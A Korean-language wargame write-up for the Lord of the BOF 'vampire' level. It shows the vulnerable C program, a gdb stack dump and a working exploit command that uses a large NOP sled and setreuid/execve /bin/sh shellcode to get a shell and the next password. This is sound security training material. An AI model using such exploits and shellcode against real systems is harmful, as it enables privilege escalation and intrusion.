Troll -> Vampire

**vampire.c**
```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - vampire
        - check 0xbfff
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
	char buffer[40];

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

        // here is changed!
        if(argv[1][46] == '\xff')
        {
                printf("but it's not forever\n");
                exit(0);
        }

	strcpy(buffer, argv[1]); 
	printf("%s\n", buffer);
}
```

이번 문제에서는 argv[1][46]이 '\xff'이면 프로그램이 종료되는 조건이 붙었습니다. 이번 문제는 스택의 구조를 조금만 이해하고 있으면 정말 간단하게 풀리는 문제입니다.

```
[troll@localhost temp]$ ./vampire `python -c 'print "\xbf"*48'` `python -c 'print "\x90"*100000'`
¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿
Segmentation fault (core dumped)
```
무식하게 '\x90'을 십만개 넣고 코어 덤프를 시켰습니다. 스텍에 들어가는 데이터 양이 많아지면 어떻게 되는지 생각해보면 금방 풀 수 있습니다.

```
(gdb) x/10000x $esp
0xbffe7480:	0x00000000	0xbffe74c4	0xbffe74d4	0x40013868
0xbffe7490:	0x00000003	0x08048380	0x00000000	0x080483a1
0xbffe74a0:	0x08048430	0x00000003	0xbffe74c4	0x080482e0
0xbffe74b0:	0x080484fc	0x4000ae60	0xbffe74bc	0x40013e90
0xbffe74c0:	0x00000003	0xbffe75be	0xbffe75c8	0xbffe75f9
0xbffe74d0:	0x00000000	0xbffffc9a	0xbffffcbc	0xbffffcc6
0xbffe74e0:	0xbffffcd4	0xbffffcf3	0xbffffd01	0xbffffd18
0xbffe74f0:	0xbffffd33	0xbffffd3e	0xbffffd4c	0xbffffd8d
0xbffe7500:	0xbffffd9e	0xbffffdb3	0xbffffdc3	0xbffffdce
0xbffe7510:	0xbffffdeb	0xbffffe03	0xbffffe0e	0xbffffe1b
0xbffe7520:	0xbffffe23	0xbfffffe6	0x00000000	0x00000003
0xbffe7530:	0x08048034	0x00000004	0x00000020	0x00000005
0xbffe7540:	0x00000006	0x00000006	0x00001000	0x00000007
0xbffe7550:	0x40000000	0x00000008	0x00000000	0x00000009
0xbffe7560:	0x08048380	0x0000000b	0x000001fc	0x0000000c
0xbffe7570:	0x000001fc	0x0000000d	0x000001fc	0x0000000e
0xbffe7580:	0x000001fc	0x00000010	0x0fabfbff	0x0000000f
0xbffe7590:	0xbffe75b9	0x00000000	0x00000000	0x00000000
0xbffe75a0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffe75b0:	0x00000000	0x00000000	0x38366900	0x2f2e0036
0xbffe75c0:	0x706d6176	0x00657269	0xbfbfbfbf	0xbfbfbfbf
0xbffe75d0:	0xbfbfbfbf	0xbfbfbfbf	0xbfbfbfbf	0xbfbfbfbf
0xbffe75e0:	0xbfbfbfbf	0xbfbfbfbf	0xbfbfbfbf	0xbfbfbfbf
0xbffe75f0:	0xbfbfbfbf	0xbfbfbfbf	0x90909000	0x90909090
0xbffe7600:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7610:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7620:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7630:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7640:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7650:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7660:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7670:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7680:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7690:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe76a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe76b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe76c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe76d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe76e0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe76f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7700:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7710:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7720:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7730:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7740:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7750:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7760:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7770:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7780:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7790:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe77a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe77b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe77c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe77d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe77e0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe77f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7800:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7810:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7820:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7830:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7840:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7850:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7860:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffe7870:	0x90909090	0x90909090	0x90909090	0x90909090
```

'\x90'이 잔뜩 있는 것과 주소가 bfff가 아닌 bffe가 된 것을 볼 수 있습니다.
스텍은 높은 주소에서 낮은 주소로 데이터가 들어가기 때문에 데이터를 많이 집어 넣으면 bfff -> bffe로 숫자가 작아지는 것을 볼 수 있습니다.

워낙 '\x90'이 많아서 웬만한 주소를 써도 공격이 잘 됩니다.

```
[troll@localhost temp]$ ./vampire `python -c 'print "A"*44 + "\x50\x7a\xfe\xbf"'` `python -c 'print "\x90"*100000 + "\x31\xc0\xb0\x31\xcd\x80\x89\xc1\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPzþ¿
bash$ exit
exit
```

```
[troll@localhost troll]$ ./vampire `python -c 'print "A"*44 + "\x50\x7a\xfe\xbf"'` `python -c 'print "\x90"*100000 + "\x31\xc0\xb0\x31\xcd\x80\x89\xc1\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPzþ¿
bash$ my-pass
euid = 509
music world
```

공격에 성공하였습니다.